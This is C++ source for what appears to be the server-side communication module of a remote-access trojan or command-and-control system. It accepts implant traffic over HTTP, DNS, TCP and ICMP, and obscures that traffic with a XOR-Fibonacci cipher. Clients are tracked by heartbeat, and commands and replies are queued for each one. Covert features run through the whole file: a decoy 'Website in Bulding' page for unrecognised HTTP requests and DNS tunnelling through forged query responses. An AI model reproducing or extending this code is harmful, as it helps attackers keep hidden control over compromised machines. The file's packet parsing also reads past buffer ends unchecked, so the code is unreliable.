#include "stdafx.h"
#include <Winsock2.h>
#include "file/MyFile.h"
#include "socket/MySocket.h"
#include "BinNames.h"
#include "MessageDefines.h"
#include "common.h"
#include "CommManager.h"
#include "DnsResolver.h"

#pragma comment(lib, "ws2_32.lib")

CommManager::CommManager()
{

}

CommManager::~CommManager()
{

}

BOOL CommManager::Init()
{
	WSAData wsaData = {0};
	::WSAStartup(MAKEWORD(2, 2), &wsaData);

	if (! m_cp.Init())
	{
		errorLog(_T("init cutup protocol failed"));
		return FALSE;
	}
// 	if (! m_icmpSocket.Create())
// 	{
// 		errorLog(_T("create icmp listen socket failed."));
// 		return FALSE;
// 	}
// 	m_bListenIcmp = TRUE;
// 	if (! m_icmpRecvThread.Start(IcmpListenThread, this))
// 	{
// 		errorLog(_T("start icmp listen thread failed"));
// 		return FALSE;
// 	}

	RegisterMsgHandler(MSGID_AVAILABLE_COMM, MsgHandler_AvailableComm, this);

	return TRUE;
}

void CommManager::Deinit()
{
	m_cp.Deinit();

	m_bListenIcmp = FALSE;
	m_icmpSocket.Close();
	m_icmpRecvThread.WaitForEnd();

	::WSACleanup();
}
int CommManager::AddCommService(int port,int name)
{
	COMM_MAP::iterator it;
	int serial;

	do 
	{
		serial = rand()%100;
		if (serial == 0)
		{
			serial = rand()%100;
		}

		it = m_commMap.find(serial);
	} while (it != m_commMap.end());
	
	COMMINFO info;

	switch(name)
	{
	case COMMNAME_HTTP:
		{
			TcpServer* httpServer = new TcpServer;
			httpServer->Init(HttpMsgHandler,this);

			if (! httpServer->StartListening(port, 0, 30))
			{
				delete httpServer;
				return 0;
			}

			info.lpParameter = httpServer;
			info.nCommName = COMMNAME_HTTP;

			m_commMap.insert(MAKE_PAIR(COMM_MAP,serial,info));

			break;
		}
	case COMMNAME_DNS:
		{
			UdpServer* DnsServer = new UdpServer;
			DnsServer->Init(UdpMsgHandler,this);

			if (! DnsServer->Start(port))
			{
				delete DnsServer;
				return 0;
			}

			info.lpParameter = DnsServer;
			info.nCommName = COMMNAME_DNS;

			m_commMap.insert(MAKE_PAIR(COMM_MAP,serial,info));

			break;
		}
	case COMMNAME_TCP:
		{
			TcpServer* tcpServer = new TcpServer;
			tcpServer->Init(TcpMsgHandler,this);

			if (! tcpServer->StartListening(port, 0, 30))
			{
				delete tcpServer;
				return 0;
			}

			info.lpParameter = tcpServer;
			info.nCommName = COMMNAME_TCP;

			m_commMap.insert(MAKE_PAIR(COMM_MAP,serial,info));

			break;
		}
	default:
		return 0;
	}

	return serial;
}

BOOL CommManager::DeleteCommService(int serialid)
{
	COMM_MAP::iterator it = m_commMap.find(serialid);
	BOOL bRet = TRUE;

	if (it != m_commMap.end())
	{
		COMMINFO &info = it->second;
		switch(info.nCommName)
		{
		case COMMNAME_HTTP:
			{
				TcpServer* httpServer = (TcpServer*)info.lpParameter;
				httpServer->Stop();
				break;
			}
		case COMMNAME_DNS:
			{
				UdpServer* dnsServer = (UdpServer*)info.lpParameter;
				dnsServer->Stop();
				break;
			}
		case COMMNAME_TCP:
			{
				TcpServer* tcpServer = (TcpServer*)info.lpParameter;
				tcpServer->Stop();
				break;
			}
		default:
			bRet = FALSE;
			break;
		}
		delete it->second.lpParameter;
		return TRUE;
	}
	else bRet = FALSE;

	return bRet;
}

BOOL CommManager::ModifyPacketStatus( CPSERIAL serial,LPCTSTR clientid,BOOL status )
{
	CPGUID guid;
	if(!m_cp.Str2CPGuid(clientid,guid))
	{
		return FALSE;
	}
	return m_cp.ModifyPacketStatus(guid,serial,status);
}

MSGSERIALID CommManager::AddToSendMessage( LPCTSTR clientid, const CommData& commData, BOOL bNeedReply /*= TRUE*/ )
{
	static MSGSERIALID s_serialid = 0;
	if (0 == s_serialid)
	{
		__time64_t now;
		_time64(&now);
		s_serialid = now;
	}

	CPGUID cpguid;
	if (! CutupProtocol::Str2CPGuid(clientid, cpguid))
	{
		errorLog(_T("transfer clientid failed[%s]"), clientid);
		return INVALID_MSGSERIALID;
	}

	MSGSERIALID ret = INVALID_MSGSERIALID;

	if (bNeedReply)
	{
		m_mapSection.Enter();
		{
			ClientDataMap::iterator finditer = m_clientDataMap.find(clientid);
			if (finditer == m_clientDataMap.end())
			{
				DataMap am;
				std::pair<ClientDataMap::iterator, bool> res = m_clientDataMap.insert(ClientDataMap::value_type(clientid, am));
				if (res.second)
				{
					finditer = res.first;
				}
			}

			if (finditer != m_clientDataMap.end())
			{
				DataMap& am = finditer->second;

				SEND_AND_REPLY tempAA;
				std::pair<DataMap::iterator, bool> res = am.insert(DataMap::value_type(s_serialid, tempAA));
				if (res.second)
				{
					SEND_AND_REPLY& aa = res.first->second;
					aa.bReply = FALSE;
					aa.sendData = commData;
					aa.sendData.SetSerialID(s_serialid);
					aa.cpSerial = 0;
					ret = s_serialid;

					ByteBuffer toSendData;
					aa.sendData.Serialize(toSendData);
					BOOL bPutMsg = m_cp.PutMessage(cpguid, toSendData, toSendData.Size(), COMMNAME_DEFAULT, 0, &aa.cpSerial);
					if (! bPutMsg)
					{
						errorLog(_T("put message msgid[%I64u] failed"), aa.sendData.GetMsgID());
					}
				}

				s_serialid++;
			}
		}
		m_mapSection.Leave();
	}
	else
	{
		m_mapSection.Enter();
		{
			CommData sendData = commData;
			sendData.SetSerialID(s_serialid);
			ret = s_serialid;

			ByteBuffer toSendData;
			sendData.Serialize(toSendData);
			CPSERIAL cpSerial = 0;
			BOOL bPutMsg = m_cp.PutMessage(cpguid, toSendData, toSendData.Size(), COMMNAME_DEFAULT, 0, &cpSerial);
			if (! bPutMsg)
			{
				errorLog(_T("put message msgid[%I64u][noreply] failed"), sendData.GetMsgID());
			}
			
			s_serialid++;
		}
		m_mapSection.Leave();
	}

	return ret;
}

BOOL CommManager::GetReplyMessage( LPCTSTR clientid, MSGSERIALID serialid, CommData& replyData )
{
	BOOL bReplied = FALSE;

	m_mapSection.Enter();
	{
		ClientDataMap::iterator finditer = m_clientDataMap.find(clientid);
		if (finditer != m_clientDataMap.end())
		{
			DataMap& am = finditer->second;

			DataMap::iterator aaIter = am.find(serialid);
			if (aaIter != am.end())
			{
				SEND_AND_REPLY& aaData = aaIter->second;
				if (aaData.bReply)
				{
					replyData = aaData.replyData;
					bReplied = TRUE;

					am.erase(aaIter);
				}
			}
		}
	}
	m_mapSection.Leave();

	return bReplied;
}

void CommManager::CleanRequest( LPCTSTR clientid, MSGSERIALID serialid )
{
	m_mapSection.Enter();
	{
		ClientDataMap::iterator finditer = m_clientDataMap.find(clientid);
		if (finditer != m_clientDataMap.end())
		{
			DataMap& am = finditer->second;

			DataMap::iterator aaIter = am.find(serialid);
			if (aaIter != am.end())
			{
				am.erase(aaIter);
			}
		}
	}
	m_mapSection.Leave();
}

void CommManager::ListAvailableClient( TStringVector& clientidList, DWORD dwDiffS /*= 60 * 5*/ )
{
	__time64_t now;
	_time64(&now);

	m_mapSection.Enter();
	{
		HeartbeatMap::iterator iter = m_heartbeatMap.begin();
		for (; iter != m_heartbeatMap.end(); iter++)
		{
			__time64_t lastHeartbeat = iter->second.time;
			if (now >= lastHeartbeat && now - lastHeartbeat < dwDiffS)
			{
				clientidList.push_back(iter->first);
			}
		}
	}
	m_mapSection.Leave();
}

BOOL CommManager::GetLastConnectionAddr( LPCTSTR clientid, SOCKADDR_IN& addr )
{
	BOOL bFound = FALSE;
	m_mapSection.Enter();
	{
		HeartbeatMap::const_iterator finditer = m_heartbeatMap.find(clientid);
		if (finditer != m_heartbeatMap.end())
		{
			addr = finditer->second.lastAddr;
			bFound = TRUE;
		}
	}
	m_mapSection.Leave();

	return bFound;
}

void CommManager::RegisterMsgHandler( MSGID msgid, FnMsgHandler fnHandler, LPVOID lpParameter )
{
	m_msgHandlerSection.Enter();
	{
		MsgHandlerMap::iterator finditer = m_msgHandlerMap.find(msgid);
		if (finditer == m_msgHandlerMap.end())
		{
			MsgHandlerInfoList handlerList;
			std::pair<MsgHandlerMap::iterator, bool> res = m_msgHandlerMap.insert(MsgHandlerMap::value_type(msgid, handlerList));
			if(res.second) finditer = res.first;
		}

		if (finditer != m_msgHandlerMap.end())
		{
			MSG_HANDLER_INFO info;
			info.fnCallback = fnHandler;
			info.lpParameter = lpParameter;

			finditer->second.push_back(info);
		}
	}
	m_msgHandlerSection.Leave();
}

void CommManager::HandleMsgByMsgHandler( MSGID msgid, const CommData& commData )
{
	MsgHandlerInfoList handlerList;
	m_msgHandlerSection.Enter();
	{
		MsgHandlerMap::iterator finditer = m_msgHandlerMap.find(msgid);
		if (finditer != m_msgHandlerMap.end())
		{
			handlerList = finditer->second;
		}
	}
	m_msgHandlerSection.Leave();

	MsgHandlerInfoList::iterator iter = handlerList.begin();
	for (; iter != handlerList.end(); iter++)
	{
		MSG_HANDLER_INFO& info = *iter;
		if (! info.fnCallback(msgid, commData, info.lpParameter))
		{
			break;
		}
	}
}

BOOL CommManager::HttpMsgHandler( SOCKADDR_IN addr, SOCKET clientSocket, const LPBYTE pData, DWORD dwDataSize, LPBYTE pSessionData, LPVOID lpParameter )
{
	if (NULL == pData) return FALSE;

	CommManager* pMgr = (CommManager*) lpParameter;
	return pMgr->HttpMsgHandleProc(addr, clientSocket, pData, dwDataSize, pSessionData);
}


int GetHttpHeaderSize(const LPBYTE pRecvData,int nLength)
{
	char* lpHeaderEnd = strstr((char*)pRecvData,"\r\n\r\n");
	if (!lpHeaderEnd)
	{
		return 0;
	}
	lpHeaderEnd += 4;
	return (LPBYTE)lpHeaderEnd - (LPBYTE)pRecvData;
}

int GetHttpPacketSize(const LPBYTE pRecvData,int nLength)
{
	int nSaveSize = 0;
	int nSize = lstrlenA("Content-Length: ");

	int nHeaderLength = GetHttpHeaderSize(pRecvData,nLength);

	char* lpLength = strstr((char*)pRecvData,"Content-Length: ");

	if (!lpLength || !strstr(lpLength,"\r"))
	{
		return 0xFFFFFFFF;
	}

	lpLength += nSize;

	lpLength = strstr(lpLength,"\r") - 1;

	int i = 0;
	int sum = 1;

	while(*lpLength != ' ')
	{
		nSaveSize += (lpLength[0]-'0')*sum;
		i ++;
		lpLength --;
		sum *= 10;
	}

	return nSaveSize;

}

BOOL IsHttpHead(PBYTE pData,DWORD dwSize)
{
	while(dwSize)
	{
		if ((*(pData + dwSize) == '\n') && (*(pData + dwSize - 1) == '\r'))
		{
			if ((*(pData + dwSize - 2) == '\n') && (*(pData + dwSize - 3) == '\r'))
			{
				return TRUE;
			}
		}

		dwSize--;
	}
	return FALSE;
}

BOOL CommManager::ParseHttpPacket( SOCKET sSocket,LPBYTE pData,int dwDataSize,LPBYTE* outData,int& outSize )
{
	HTTP_PACKET packet;

	BOOL ret = FALSE;

	//首次处理某个包
	HttpPacketMap::iterator it = m_httpPacketMap.find(sSocket);
	if (it == m_httpPacketMap.end())
	{
		packet.buffer = (LPBYTE)malloc(dwDataSize);

		memcpy(packet.buffer,pData,dwDataSize);

		packet.nCurSize = dwDataSize;

	}
	//粘包了
	else
	{
		packet = m_httpPacketMap[sSocket];

		LPBYTE tmp = (LPBYTE)malloc(packet.nCurSize+dwDataSize);

		memcpy(tmp,packet.buffer,packet.nCurSize);
		memcpy(tmp+packet.nCurSize,pData,dwDataSize);

		free(packet.buffer);

		packet.buffer = tmp;
		packet.nCurSize += dwDataSize;

	}

	//检查包是否完整，进入处理流程
	int nBody = GetHttpPacketSize(packet.buffer,packet.nCurSize);

	if (nBody != 0xFFFFFFFF)
	{
		packet.nMaxSize = nBody;
	}

	int nHead = GetHttpHeaderSize(packet.buffer,packet.nCurSize);

	if (packet.nCurSize - nBody == nHead)
	{
		LPBYTE p = packet.buffer;

		for (int i = 0 ; i < packet.nCurSize ; i++)
		{
			if (p[i] == '\r' && p[i+1] == '\n')
			{
				if (p[i + 2] == '\r' && p[i+3] == '\n')
				{
					*outData = p + i + 4;
				}
			}
		}

		outSize = nBody;
		ret = TRUE;
	}
	m_httpPacketMap[sSocket] = packet;

	return ret;
}

void CommManager::FreeHttpPacket( SOCKET s )
{
	HttpPacketMap::iterator it = m_httpPacketMap.find(s);

	if (it != m_httpPacketMap.end())
	{
		free(it->second.buffer);
		m_httpPacketMap.erase(it);
	}

}

BOOL CommManager::HttpMsgHandleProc( SOCKADDR_IN addr, SOCKET clientSocket, const LPBYTE pData, DWORD dwDataSize, LPBYTE pSessionData )
{
	BOOL bValidData = FALSE;
	BOOL bHasReply = FALSE;
	do 
	{
		m_csHttpmap.Enter();
		{
			PBYTE p = NULL;
			int iDataLength = 0;

			if(!ParseHttpPacket(clientSocket,pData,dwDataSize,&p,iDataLength))
			{
				m_csHttpmap.Leave();
				return TRUE;
			}
			ByteBuffer toSendBuffer;
			bHasReply = HandleMessageAndReply(addr, p, iDataLength, COMMNAME_HTTP, bValidData, HTTP_COMM_REPLY_MAXSIZE, toSendBuffer);

			FreeHttpPacket(clientSocket);

			if (bHasReply)
			{
				HttpReply(clientSocket, toSendBuffer, toSendBuffer.Size());
			}
		}
		m_csHttpmap.Leave();

	} while (FALSE);
	
	if (! bValidData)
	{
		std::string data = "Website in Bulding";
		HttpReply(clientSocket, (LPBYTE)data.c_str(), data.size());
		return FALSE;
	}
	
	return TRUE;
}

void CommManager::MakeHttpHeader( std::ostringstream& ss, DWORD dwContentLength) const
{
	ss << "HTTP/1.1 200 OK\r\n";
	ss << "Content-type: text/html\r\n";
	ss << "vary: Vary: Accept-Encoding\r\n";
	ss << "Content-length: " << dwContentLength << "\r\n";
	ss << "Connection: Keep-Alive\r\n";
	ss << "\r\n";
}

void CommManager::HttpReply( SOCKET clientSocket, const LPBYTE pData, DWORD dwSize ) const
{
	MySocket sock(clientSocket, FALSE);

	std::ostringstream ss;
	MakeHttpHeader(ss, dwSize);
	
	std::string data((LPCSTR)pData, dwSize);
	ss << data;
	
	std::string tosend = ss.str();

	int iSent = sock.SendAll(tosend.c_str(), tosend.size());
	if (!iSent)
	{
		errorLog(_T("sent %d. expected:%u"), iSent, tosend.size());
	}
}

BOOL CommManager::HandleMessage( SOCKADDR_IN fromAddr, const LPBYTE pData, DWORD dwDataSize, COMM_NAME commName, CPGUID& cpguid )
{
	ByteBuffer dataBuffer;
	dataBuffer.Alloc(dwDataSize);
	if (! XorFibonacciCrypt(pData, dwDataSize, (LPBYTE)dataBuffer, 2, 7))
	{
		return FALSE;
	}

	BOOL bRet = m_cp.AddRecvPacket(dataBuffer, dataBuffer.Size(), commName, &cpguid);

	if (m_cp.HasReceivedMsg())
	{
		CPGUID from;
		ByteBuffer recvMsgData;
		if (m_cp.RecvMsg(recvMsgData, from))
		{
			//解析数据
			CommData recvCommdata;
			if (recvCommdata.Parse(recvMsgData, recvMsgData.Size()))
			{
				debugLog(_T("recv msg msgid[%I64u] serial[%I64u]"), recvCommdata.GetMsgID(), recvCommdata.GetSerialID());
				tstring clientid;
				CutupProtocol::CPGuid2Str(from, clientid);
				recvCommdata.SetClientID(clientid.c_str());

				SetMessageToAnswer(recvCommdata);

				HandleMsgByMsgHandler(recvCommdata.GetMsgID(), recvCommdata);
			}
			else
			{
				errorLog(_T("parse message failed"));
			}
		}
	}

	if (bRet)
	{
		//更新心跳数据
		tstring clientid;
		CutupProtocol::CPGuid2Str(cpguid, clientid);
		
		UpdateHeartbeat(clientid.c_str(), fromAddr);
	}

	return bRet;
}

BOOL CommManager::HandleMessageAndReply( SOCKADDR_IN fromAddr, const LPBYTE pData, DWORD dwDataSize, COMM_NAME commName, BOOL& bValidData, DWORD replyMaxDataSize, ByteBuffer& replyBuffer )
{
	CPGUID cpguid;
	bValidData = HandleMessage(fromAddr, pData, dwDataSize, commName, cpguid);
	if (! bValidData)
	{
		return FALSE;
	}

	//找到需要发送的消息
	ByteBuffer toSendData;
	if (! m_cp.GetMessageToSendById(cpguid, replyMaxDataSize, toSendData))
	{
		m_cp.CreateEmptyPacket(toSendData);
	}
	
	replyBuffer.Alloc(toSendData.Size());
	BOOL bEncryptOK = XorFibonacciCrypt((LPBYTE)toSendData, toSendData.Size(), (LPBYTE)replyBuffer, 2, 7);

	return bEncryptOK;
}

BOOL CommManager::GetPacketForClient( const CPGUID& cpguid, PCP_PACKET* ppPacket )
{
	BOOL bRet = FALSE;
	m_mapSection.Enter();
	{
		ToSendPacketMap::iterator finditer = m_tosendPacketMap.find(cpguid);
		if (finditer != m_tosendPacketMap.end())
		{
			ToSendPacketQueue& packetQueue = finditer->second;
			if (packetQueue.size() > 0)
			{
				*ppPacket = packetQueue.front();
				packetQueue.pop_front();
				bRet = TRUE;
			}
		}
	}
	m_mapSection.Leave();

	return bRet;
}

BOOL CommManager::SetMessageToAnswer( const CommData& commData )
{
	BOOL bFound = FALSE;

	m_mapSection.Enter();
	{
		ClientDataMap::iterator finditer = m_clientDataMap.find(commData.GetClientID());
		if (finditer != m_clientDataMap.end())
		{
			DataMap& answerMap = finditer->second;

			MSGSERIALID serialid = commData.GetSerialID();
			DataMap::iterator aaiter = answerMap.find(serialid);
			if (aaiter != answerMap.end())
			{
				SEND_AND_REPLY& aaData = aaiter->second;
				if (! aaData.bReply)
				{
					aaData.bReply = TRUE;
					aaData.replyData = commData;
					bFound = TRUE;
				}
			}
		}
	}
	m_mapSection.Leave();

	return bFound;
}

void CommManager::UpdateHeartbeat( LPCTSTR clientid, SOCKADDR_IN addr )
{
	__time64_t now;
	_time64(&now);

	m_mapSection.Enter();
	{
		HeartbeatMap::iterator finditer = m_heartbeatMap.find(clientid);
		if (finditer != m_heartbeatMap.end())
		{
			finditer->second.time = now;
			finditer->second.lastAddr = addr;
		}
		else
		{
			HEARTBEAT_INFO info;
			info.time = now;
			info.lastAddr = addr;
			m_heartbeatMap[clientid] = info;
		}
	}
	m_mapSection.Leave();
}

void CommManager::UdpMsgHandler( SOCKADDR_IN addr, SOCKET listenSocket, const LPBYTE pData, DWORD dwDataSize, LPVOID lpParameter )
{
	if (NULL == pData) return;

	CommManager* pMgr = (CommManager*) lpParameter;
	pMgr->UdpMsgHandlerProc(addr, listenSocket, pData, dwDataSize);
}

void CommManager::UdpMsgHandlerProc( SOCKADDR_IN addr, SOCKET listenSocket, const LPBYTE pData, DWORD dwDataSize )
{
	LPBYTE pMsgData = NULL;
	DWORD dwMsgDataSize = CDnsResolver::ParseQueryPacket(pData, dwDataSize, &pMsgData);
	BOOL bValidData = FALSE;
	ByteBuffer replyBuffer;
	BOOL bHasReply = HandleMessageAndReply(addr, pMsgData, dwMsgDataSize, COMMNAME_DNS, bValidData, DNS_COMM_REPLY_MAXSIZE, replyBuffer);
	CDnsResolver::FreePacketBuffer(pMsgData);
	if (bHasReply)
	{
		LPBYTE pBuffer = NULL;
		UINT uLen = 0;
		uLen = CDnsResolver::BuildResponsePacket(pData, dwDataSize, inet_addr("202.106.0.20"), replyBuffer, replyBuffer.Size(), &pBuffer);
		::sendto(listenSocket, (char*)pBuffer, uLen, 0, (SOCKADDR*)&addr, sizeof(addr));
		CDnsResolver::FreePacketBuffer(pBuffer);
	}
}

BOOL CommManager::ParseTcpPacket(SOCKET sSocket,LPBYTE pData,int nSize,LPBYTE* outData,int& outSize)
{
	TCP_PACKET packet;

	TcpPacketMap::iterator it = m_tcpPacketMap.find(sSocket);

	//新的包头开始
	if (it == m_tcpPacketMap.end())
	{
		//判断是否符合协议
		if (*((UINT*)pData) == TCP_FLAG)
		{
			packet.header = *((TCP_HEADER*)pData);
			packet.buffer = (LPBYTE)malloc(packet.header.nSize);
			packet.nCurSize = nSize - sizeof(TCP_HEADER);
			memcpy(packet.buffer,pData + sizeof(TCP_HEADER),nSize - sizeof(TCP_HEADER));
		}
		else
		{
			return FALSE;
		}
	}
	else
	{
		packet = m_tcpPacketMap[sSocket];
		packet.buffer = (PBYTE)realloc(packet.buffer,packet.nCurSize+nSize);
		memcpy(packet.buffer + packet.nCurSize,pData,nSize);
		packet.nCurSize += nSize;
	}
	
	m_tcpPacketMap[sSocket] = packet;

	//判断是否接收完成

	if (packet.nCurSize == packet.header.nSize)
	{
		outSize = packet.header.nSize;
		*outData = packet.buffer;
		return TRUE;
	}

	return FALSE;
}
void CommManager::FreeTcpPacket(SOCKET s)
{
	TcpPacketMap::iterator it = m_tcpPacketMap.find(s);

	if (it != m_tcpPacketMap.end())
	{
		free(it->second.buffer);
		m_tcpPacketMap.erase(it);
	}
}

BOOL CommManager::TcpMsgHandler( SOCKADDR_IN addr, SOCKET clientSocket, const LPBYTE pData, DWORD dwDataSize, LPBYTE pSessionData, LPVOID lpParameter )
{
	if (NULL == pData) return FALSE;

	CommManager* pMgr = (CommManager*) lpParameter;
	return pMgr->TcpMsgHandlerProc(addr, clientSocket, pData, dwDataSize, pSessionData);
}

BOOL CommManager::TcpMsgHandlerProc( SOCKADDR_IN addr, SOCKET clientSocket, const LPBYTE pData, DWORD dwDataSize, LPBYTE pSessionData )
{
	BOOL bValidData = FALSE;
	BOOL bNeedReply = FALSE;
	BOOL bHasRecv = FALSE;

	ByteBuffer buffer;
	int nOutSize = 0;
	LPBYTE pOutBuf = NULL;

	m_csTcpmap.Enter();
	{
		bHasRecv = ParseTcpPacket(clientSocket,pData,dwDataSize,&pOutBuf,nOutSize);
		
		if (bHasRecv)
		{
			ByteBuffer toSendBuffer;
			bNeedReply = HandleMessageAndReply(addr, pOutBuf, nOutSize, COMMNAME_TCP, bValidData, TCP_COMM_REPLY_MAXSIZE, toSendBuffer);

			FreeTcpPacket(clientSocket);

			if (bNeedReply)
			{
				TcpReply(clientSocket,toSendBuffer,toSendBuffer.Size());
			}
		}
	}
	m_csTcpmap.Leave();

	return TRUE;
}
void CommManager::MakeTcpHeader( ByteBuffer& ss,DWORD dwSize ) const
{

}

void CommManager::TcpReply(SOCKET clientSocket, const LPBYTE pData, DWORD dwSize) const
{
	MySocket sock(clientSocket, FALSE);

	TCP_HEADER header;
	header.flag = TCP_FLAG;
	header.nSize = dwSize;

	int iSent = sock.SendAll((PBYTE)&header, sizeof(TCP_HEADER));
	if (!iSent)
	{
		errorLog(_T("sent %d. expected:%u"), iSent, sizeof(TCP_HEADER));
	}

	iSent = sock.SendAll(pData, dwSize);
	if (!iSent)
	{
		errorLog(_T("sent %d. expected:%u"), iSent, dwSize);
	}
}


DWORD WINAPI CommManager::IcmpListenThread( LPVOID lpParameter )
{
	CommManager* pMgr = (CommManager*) lpParameter;
	pMgr->IcmpListenProc();
	return 0;
}

void CommManager::IcmpListenProc()
{
	while (m_bListenIcmp)
	{
		ULONG srcIP = 0;
		ULONG destIP = 0;
		ByteBuffer recvDataBuffer;
		if (! m_icmpSocket.RecvICMP(srcIP, destIP, recvDataBuffer))
		{
			errorLog(_T("recv icmp packet failed"));
			continue;
		}

		//检查是否需要进行处理
		if (m_icmpSocket.GetListenIP() != destIP) return;

		SOCKADDR_IN fromAddr;
		fromAddr.sin_addr.S_un.S_addr = srcIP;
		
		//处理数据
		CPGUID cpguid;
		HandleMessage(fromAddr, recvDataBuffer, recvDataBuffer.Size(), COMMNAME_ICMP, cpguid);
	}
}

BOOL CommManager::MsgHandler_AvailableComm( MSGID msgid, const CommData& commData, LPVOID lpParameter )
{
	DECLARE_UINT64_PARAM(commname);

	CommManager* pMgr = (CommManager*) lpParameter;

	CommData reply;
	reply.Reply(commData);
	reply.SetData(_T("commname"), commname);

	pMgr->AddToSendMessage(commData.GetClientID(), reply, FALSE);

	return TRUE;
}

BOOL CommManager::QuerySendStatus( LPCTSTR clientid, MSGSERIALID serialid, DWORD& dwSentBytes, DWORD& dwTotalBytes )
{
	CPSERIAL cpserial = 0;
	BOOL bFound = FALSE;
	m_mapSection.Enter();
	{
		ClientDataMap::iterator finditer = m_clientDataMap.find(clientid);
		if (finditer != m_clientDataMap.end())
		{
			DataMap& dataMap = finditer->second;
			DataMap::iterator msgiter = dataMap.find(serialid);
			if (msgiter != dataMap.end())
			{
				cpserial = msgiter->second.cpSerial;
				bFound = TRUE;
			}
		}
	}
	m_mapSection.Leave();

	if (! bFound) return FALSE;

	CPGUID cpguid;
	if (! CutupProtocol::Str2CPGuid(clientid, cpguid))
	{
		errorLog(_T("transfer clientid failed[%s]"), clientid);
		return FALSE;
	}

	if (! m_cp.QuerySendStatus(cpguid, cpserial, dwSentBytes, dwTotalBytes))
	{
		errorLog(_T("query send status from cp failed. [%s][%I64u]"), clientid, serialid);
		return FALSE;
	}

	return TRUE;
}

BOOL CommManager::QueryRecvStatus( LPCTSTR clientid, CPSERIAL cpserial, DWORD& dwRecvBytes )
{
	CPGUID cpguid;
	if (! CutupProtocol::Str2CPGuid(clientid, cpguid))
	{
		errorLog(_T("transfer clientid failed[%s]"), clientid);
		return FALSE;
	}

	return m_cp.QueryRecvStatus(cpguid, cpserial, dwRecvBytes);
}
